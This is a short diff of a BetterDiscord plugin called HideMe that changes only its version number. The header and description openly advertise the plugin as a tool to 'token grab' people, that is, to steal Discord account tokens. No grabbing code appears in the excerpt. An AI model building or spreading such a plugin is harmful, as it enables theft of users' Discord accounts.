@@ -2,7 +2,7 @@
  * @name HideMe
  * @author HideakiAtsuyo
  * @authorId 868150205852291183
- * @version 1.1.1
+ * @version 1.1.3
  * @description Allows you to token grab people omg
  * @invite https://discord.gg/C7yHkVSE2M
  * @donate https://www.paypal.me/HideakiAtsuyoLmao
@@ -28,7 +28,7 @@ class HideMe {
         return "Better Discord Token Grab Lmao github.com/HideakiAtsuyo";
     }
     getVersion() {
-        return "1.1.1";
+        return "1.1.3";
     }
     getAuthor() {
         return "Hideaki Atsuyo";
